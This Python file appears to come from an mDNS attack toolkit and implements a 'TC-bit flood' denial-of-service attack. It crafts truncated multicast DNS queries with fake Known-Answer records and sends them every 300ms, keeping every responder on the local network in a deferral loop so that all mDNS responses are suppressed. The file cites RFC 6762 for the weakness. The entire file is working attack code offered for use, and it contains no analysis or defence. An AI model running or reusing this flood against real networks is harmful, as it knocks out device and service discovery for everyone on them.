"""
tc_flood.py - TC-bit flood (global response suppression).

RFC 6762 Section 7.2 explicitly acknowledges this attack:
"This opens the potential risk that a continuous stream of Known-Answer
packets could, theoretically, prevent a responder from answering indefinitely."

Sends a continuous stream of truncated queries to keep all responders in
a perpetual 400-500ms deferral loop, suppressing ALL mDNS responses.
"""

import time
import struct
import sys

sys.path.insert(0, __file__.rsplit("/", 2)[0])
from mdns_core import (make_mdns_socket, send_mdns, DNSPacket,
                       TC_BIT, QR_QUERY, encode_name, rdata_a,
                       A, PTR, IN)


def build_tc_packet(query_name: str = "_services._dns-sd._udp.local.",
                    known_answers: int = 5) -> bytes:
    """
    Build a truncated query with fake Known-Answer entries.

    The TC bit signals "more Known-Answer packets coming", which forces
    responders to defer for 400-500ms each time they see one.
    """
    pkt = DNSPacket(tx_id=0, flags=QR_QUERY | TC_BIT)
    pkt.add_question(query_name, PTR, IN)

    # Add some fake known-answers to make it look legitimate
    for i in range(known_answers):
        fake_instance = f"fake-device-{i}._http._tcp.local."
        pkt.add_answer(query_name, PTR,
                       encode_name(fake_instance),
                       ttl=4500, rclass=IN)
    return pkt.build()


def flood(iface: str | None = None, duration: int = 60, interval: float = 0.3,
          query_name: str = "_services._dns-sd._udp.local."):
    """
    Flood the network with TC-bit packets.

    Each packet forces all responders to defer 400-500ms. Sending one every
    300ms keeps them permanently suppressed (the new TC packet arrives before
    the previous deferral expires).
    """
    sock = make_mdns_socket(iface)

    print(f"[*] TC-bit flood: suppressing all mDNS responses")
    print(f"[*] Interval: {interval}s, Duration: {duration}s")
    print(f"[*] Target query: {query_name}")

    pkt = build_tc_packet(query_name)
    start = time.time()
    count = 0

    try:
        while time.time() - start < duration:
            send_mdns(sock, pkt)
            count += 1
            if count % 100 == 0:
                elapsed = time.time() - start
                print(f"  [{count}] packets sent ({elapsed:.0f}s elapsed)")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start
    print(f"\n[*] Sent {count} TC packets in {elapsed:.0f}s ({count/elapsed:.1f} pps)")
    sock.close()


def run(iface: str | None = None, duration: int = 60, interval: float = 0.3):
    flood(iface, duration, interval)
